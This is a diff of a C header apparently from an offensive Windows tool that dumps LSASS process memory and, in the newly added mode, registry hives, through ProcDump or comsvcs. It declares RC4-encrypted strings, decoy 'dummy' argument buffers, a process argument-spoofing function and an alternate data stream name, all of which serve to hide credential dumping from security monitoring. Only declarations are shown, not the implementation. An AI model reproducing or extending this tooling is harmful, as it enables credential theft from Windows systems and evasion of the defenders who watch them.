@@ -15,13 +15,14 @@
 // the new data stream name
 #define NEW_STREAM L":ALT"
 
-extern unsigned char rc4Key[32];
+extern unsigned char strEncKey[32];
 extern unsigned char lsassExeStr[20];
-extern unsigned char parentProcessStr[26];
 extern unsigned char procDumpArgs[16];
-extern unsigned char dummyProcDumpArgs[216];
+extern unsigned char dummyProcDumpArgs[226];
 extern unsigned char comsvcsArgs[148];
 extern unsigned char dummyComsvcsArgs[286];
+extern unsigned char regArgs[78];
+extern unsigned char dummyRegArgs[192];
 
 typedef struct ParsedArgs {
 	CHAR*	procDumpPath;
@@ -31,6 +32,9 @@ typedef struct ParsedArgs {
 	BOOL    localMode;
 	BOOL	verboseMode;
 	BOOL	procDumpMode;
+	BOOL	noDump;
+	BOOL	regDump;
+	BOOL	connectionDelay;
 } ParsedArgs;
 
 typedef struct _PROCESS_BASIC_INFORMATION {
@@ -63,10 +67,12 @@ typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
 
 ParsedArgs ParseArgs(int argc, char* argv[]);
 WCHAR* ConvertToWideString(const char* asciiStr, size_t length);
+CHAR* ConvertToAsciiString(const WCHAR* wideStr, size_t length);
 
 BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pData, IN DWORD dwRc4KeySize, IN DWORD sDataSize);
 VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize);
-VOID GenerateFileName(char* str, int length);
+VOID GenerateFileNameA(char* str, int length);
+VOID GenerateFileNameW(wchar_t* str, int length);
 
 BOOL CreateArgSpoofProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, IN DWORD sProcDumpPathSize, IN BOOL verboseMode, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread);
 
